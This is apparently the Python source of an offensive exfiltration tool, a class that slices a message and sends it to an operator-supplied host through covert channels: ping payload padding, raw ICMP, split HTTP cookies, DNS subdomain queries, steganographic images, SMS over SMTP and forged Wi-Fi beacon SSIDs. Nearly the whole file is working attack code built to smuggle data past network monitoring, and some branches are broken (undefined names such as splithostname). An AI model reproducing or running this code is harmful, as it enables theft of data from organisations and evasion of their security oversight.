#!/usr/bin/python
import sys
from ui.ui import *
class naishoexfiltration:

	def __init__(self, message):
		self.message = message
		self.split = 0
		self.hostname = ""
		self.httpsplitrequest = message
		self.wifi_interface = ""
		self.wifi_mac = ""
		self.reporting = [[]]
	def naishosplit(self, num):
		self.split = num
		return [ self.message[start:start+self.split] for start in range(0, len(self.message), self.split) ]
	
	#def naishosplit(self, text, num):
        #        self.split = num
        #        return [ text[start:start+self.split] for start in range(0, len(text), self.split) ]
	
	def naishohttpattributebuilder(self, number):
		import random
		count = 0
		cookie=""
		string = self.naishosplit(number)
		while (count < len(string)):
			cookiename = random.choice(['SESSIONID=', 'GUID=', 'P6=', 'IPX=', 'CMD=', 'GUID2=', 'C2CID=', 'PP=', 'FE=', 'SESSION66=', 'WID=', 'WTID=', 'FCL=', 'MAA=', 'QQ=', 'E3=', 'POS55='])
			if (count == len(string)):
				cookie = cookie + cookiename + string[count]
			else:
				cookie = cookie + cookiename + string[count] +"; "
				count = count+1
		return cookie
	def naishoicmp(self):
	#--------------------------------------------|
	#		ICMP			     |
	#--------------------------------------------|------------------------------------------------------------------------------------------------
		import base64
		import time
		import os
		splitmessage = self.naishosplit(32)
		try:
			choice = raw_input("[1] ICMP packet(os.system)\n[2] ICMP socket(scapy)\n[3] ICMP TCP socket\n")
			self.hostname = raw_input("IP Address to send the data using ICMP: ")
			count = 0

			

			if (choice == str(1)): ############ Choice 1: os.system PING ###########
				while (count < len(splitmessage)): #ICMP packets 
					print "\033[32m[+]\033[0m" + splitmessage[count]
					if (count == len(splitmessage)-1):
						splitmessage[count]=splitmessage[count] + "FFFFFFFFFF" # Padding for final Packet-Stopping point (unify)
					response = os.system("ping -c 1 -p " + splitmessage[count] + " " + self.hostname)
					count = count +1
					time.sleep(1) #Slow down packet as to not flood and seem real.


			elif choice == str(2):
				from scapy.all import *
				
				while (count < len(splitmessage)):
					print "\033[32m[+]\033[0m" + splitmessage[count]
					ip=sr1(IP(dst=self.hostname)/ICMP()/Raw(load=splitmessage[count]))
					count = count + 1
					time.sleep(1)

			elif choice == str(3):
				import socket
				import datetime
        			my_socket = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.getprotobyname('icmp'))
        			#my_socket = socket.setsockopt(socket.SOL_IP, socket.IP_HDRINCL, 0)
        				
				#my_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.getprotobyname('icmp'))
        			my_socket.connect((self.hostname, 0))
			
				print "[+] Packet being sent with DateTime Stamp: " + str(datetime.datetime.now())
        		
				while (count < len(splitmessage)): #ICMP packets
        				print "[+] Packet being sent in request: " + splitmessage[count]
                			my_socket.sendall(splitmessage[count])
                			count = count +1
                			time.sleep(1) #Slow down packet as to not flood and seem real.
			elif choice == choice(4):
				from scapy.all import *
                                while (count < len(splitmessage)):
					ans,unans=src(IP(dst=splithostname)/UDP(dport=0)/Raw(load=splitmessage[count]))
					count = count + 1
                                        time.sleep(1)
			else:
				pass
			self.reporting.append(['10.1.1.45', self.hostname,'ICMP', 'n/a', 'Success'])
		except:
			self.reporting.append(['10.1.1.45', self.hostname,'ICMP', 'n/a', 'Failed'])
			print "Error: Either the destination server is not up or Scapy is not installed" 
			raw_input("Press Enter to continue...")
			pass
	def naishohttp(self):
        #--------------------------------------------|
        #               HTTP                         |
        #--------------------------------------------|------------------------------------------------------------------------------------------------

		try:
			from urlparse import urlparse
			from httplib import HTTPConnection
			self.hostname = raw_input("IP Address to send the data using HTTP: ")
			url = "http://" + self.hostname
			data = "subject=:Alice-subject&addbbcode18=%23444444&addbbcode20=0&helpbox=Close+all+open+bbCode+tags&message=alice-body&poll_title=&add_poll_option_text=&poll_length=&mode=newtopic&sid=5b2e663a3d724cc873053e7ca0f59bd0&f=1&name=openopenopen&post=Submit"
			
			cookie = self.naishohttpattributebuilder(16)
			urlparts = urlparse(url)
			portnumber = raw_input("Port Number: ")
			#cutrequest = int(raw_input("Number of request to send: "))
			numnum = int(raw_input("Number of slices for data: "))
			cookie = self.naishohttpattributebuilder(numnum)
			conn = HTTPConnection(urlparts.netloc, urlparts.port or portnumber)
			conn.request("POST", urlparts.path, data, {'Cookie': cookie})
			

			print "\n[+] Request has been sent....."
			raw_input("Press Enter to continue...")
			#resp = conn.getresponse()
			#body = resp.read()
			self.reporting.append(['10.1.1.45', self.hostname,'TCP', portnumber+'(HTTP)', 'Success'])
		except:
			self.reporting.append(['10.1.1.45', self.hostname,'TCP', portnumber+'(HTTP)', 'Failed'])
			print "\n[-] HTTP is not permitted or you are pointing to a server not listening on this port!!!"
			raw_input("Press Enter to continue...")
			pass
	def naishosteghide(self):
        #--------------------------------------------|
        #               StegoHide                    |
        #--------------------------------------------|------------------------------------------------------------------------------------------------

		try:
			import os
			jpg = raw_input("\033[31mType Path of jpg:\n: \033[0m")
			encryptedfile = raw_input("Type Path of encrypted Text File:\n: ")
			f = open(encryptedfile, 'r+')
			f.write(self.message)
			passphrase = raw_input("\033[31mType passphrase of stego file:\n:\033[0m ")
			response = os.system("steghide embed -cf "+ jpg + " -ef " + encryptedfile + " -p " + passphrase)
			
			print "\n[+] File has been created...."
			raw_input("Press Enter to continue...")
		except:
			print "\n[-] Stego Hide is not installed or file is not in correct location!!!"
			raw_input("Press Enter to continue...")
			pass

	def naishostepic(self):
	#--------------------------------------------|
        #               Stepic                       |
        #--------------------------------------------|------------------------------------------------------------------------------------------------

		try:
			from PIL import Image
			import stepic
			old_image = raw_input("\033[31mType Path of jpg: \033[0m")
			picture = Image.open(old_image)
			encode_picture = stepic.encode(picture,self.message)
			new_image = raw_input("\033[31mType the name of the new file: \033[0m")
			encode_picture.save(new_image,"PNG")
			picture.show()  

		except:
			print "[-] Stepic Library is not installed!!!"
			raw_input("Press Enter to continue...")
	def naishodns(self):
	#--------------------------------------------|
        #               DNS                          |
        #--------------------------------------------|------------------------------------------------------------------------------------------------

		self.hostname = raw_input("IP Address to send the data using DNS: ")
		
		domainname = raw_input("\033[31mType domain of the destination DNS server:\n\033[0m")
		splitmessage = self.naishosplit(32)
		count =0
		try:
			
			choice = raw_input("[1] DNS packet (scapy)\n[2] DNS packets (sockets)\n\n")
			from scapy.all import *
			if choice == str(1):
				while (count < len(splitmessage)):
					ip=sr1(IP(dst= self.hostname)/UDP()/DNS(rd=1,qd=DNSQR(qname= splitmessage[count] + "." + domainname)))
					count = count + 1
					time.sleep(1)
					print splitmessage[count] + "." + domainname
			elif choice == str(2):
				import socket
				while (count < len(splitmessage)):
					print "[+] " + splitmessage[count]
					s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					s.connect((self.hostname, 53))
					s.sendall(splitmessage[count] + "." + domainname)
					s.close()
					time.sleep(1)
					count = count +1
			else:
				pass
			self.reporting.append(['10.1.1.45', self.hostname,'TCP','53(DNS)', 'Success'])
		except:
			self.reporting.append(['10.1.1.45', self.hostname,'TCP','53(DNS)', 'Failed'])
			print "Error: Either Destination server is not listening over port 53 or scapy is not installed."
			raw_input("Press Enter to continue...")
	def naishohttpproxy(self):
        #--------------------------------------------|
        #               Proxy Gateway                |
        #--------------------------------------------|------------------------------------------------------------------------------------------------

		try:
			import urllib
			import urllib2
			proxy = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}
			opener = urllib.FancyURLopener(proxy)
	
			input = raw_input("Destination URL:")
			opener.addheaders = [('User-agent', 'Mozilla/5.0')]
			f = opener.open(input, self.message)
			print f.read()
		except:
			print "Destiantion Proxy Gateway Server is not listening on this port!!!"
			raw_input("Press Enter to continue...")
			pass



	def naishoexport(self):
        #--------------------------------------------|
        #               Export to a file             |
        #--------------------------------------------|------------------------------------------------------------------------------------------------

		encrypted_file = raw_input("Type path of saving text file: ")
		f = open(encrypted_file, 'w')
		f.write(self.message)
		print "\n \033[32m[+]\033[0m File has been written out to " + encrypted_file + "."
		f.close()
		raw_input("Press Enter to continue...")
	def naishotextmessage(self):
        #--------------------------------------------|
        #               Text Message                 |
        #--------------------------------------------|------------------------------------------------------------------------------------------------	
		try:
			import getpass
			import smtplib
			email = raw_input("Email: ")
			password = getpass.getpass("Password: ")
			phonenumber = getpass.getpass("Phone number: ")
			choice = raw_input("[1] Gmail SMTP server to AT&T\n[2] Custom SMTP server\n\n:")
			if choice == str(1):
				external_email = smtplib.SMTP( "smtp.gmail.com", 587 )
				external_email.starttls()
				external_email.login( email, password )
				external_email.sendmail( 'N!nj@Z', phonenumber+"@mms.att.net", self.message )
				print "\n\033[32m[+]\033[0m Text Has been sent."
				raw_input("Press Enter to continue...")
			elif choice == str(2):
				mailserver = raw_input("SMTP Server: ")
				port = raw_input("Port: ")
				external_email = smtplib.SMTP( mailserver, int(port) )
                                external_email.starttls()
                                external_email.login( email, password )
                                external_email.sendmail( 'N!nj@Z', phonenumber, self.message )
                                print "\n\033[32m[+]\033[0m Text Has been sent."
                                raw_input("Press Enter to continue...")
				pass
			self.reporting.append(['10.1.1.45', phonenumber+"@mms.att.net",'TCP','SMTP', 'Success'])
		except:
			self.reporting.append(['10.1.1.45', phonenumber+"@mms.att.net",'TCP','SMTP', 'Failed'])
			print "[-] Server is not respnding to destination port!!!"
			raw_input("Press Enter to continue...")
		
	def naishoshowdata(self):
		banner1()
		print self.message + "\n\n"
		raw_input("Press Enter to continue...")
	

	def timeout_command(self, command, timeout):
		import subprocess, datetime, os, time, signal
		start = datetime.datetime.now()
		process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		while process.poll() is None:
			time.sleep(0.1)
			now = datetime.datetime.now()
			if (now - start).seconds> timeout:
				os.kill(process.pid, signal.SIGKILL)
				os.waitpid(-1, os.WNOHANG)
				return None
		return process.stdout.read()


	
	def naishowifi(self):
	#--------------------------------------------|
	#               WIFI Exfil                   |
	#--------------------------------------------|------------------------------------------------------------------------------------------------
		import subprocess
		self.wifi_interface = raw_input("Please Enter the monitor Wifi-interface: ")
		self.wifi_mac = raw_input("\033[31mEnter the Wifi Mac Address for Exfiltration: \033[0m")
		splitmessage = self.naishosplit(32)
		count =0
		try:
			choice = raw_input("[1] Wireless SSID Exfiltration(airbase-ng)\n[2] Wireless SSID Exfiltration(scapy)\n\n")
			if choice == str(1):
				while (count < len(splitmessage)):
					lol = self.timeout_command(["airbase-ng", "-a", self.wifi_mac, "--essid", splitmessage[count], "-c", "11", self.wifi_interface], 1)
					print "[+] Sent packet " + splitmessage[count] + "\n"
					count = count + 1
			elif choice == str(2):
				from scapy.all import *
				while (count < len (splitmessage)):
					ip = sendp(RadioTap(version=0,pad=0,len=13,notdecoded='\x02\x00\x00\x00\x00')/Dot11(subtype=8L,addr1='ff:ff:ff:ff:ff:ff', addr2='aa:aa:aa:aa:aa:aa', addr3='aa:aa:aa:aa:aa:aa')/Dot11Beacon(beacon_interval=100, )/Dot11Elt(ID='SSID', len=len(splitmessage[count]), info=splitmessage[count]), iface=self.wifi_interface)
					print splitmessage[count]
					count = count +1
			self.reporting.append(['10.1.1.45', 'aa:aa:aa:aa:aa:aa','802.11','n/a', 'Success'])
			raw_input("Press Enter to continue...") 
		except:
                        self.reporting.append(['10.1.1.45', 'aa:aa:aa:aa:aa:aa','802.11','n/a', 'Failed'])
			print "Error: Either Destination server is not listening over port 53 or scapy is not installed."
			raw_input("Press Enter to continue...")
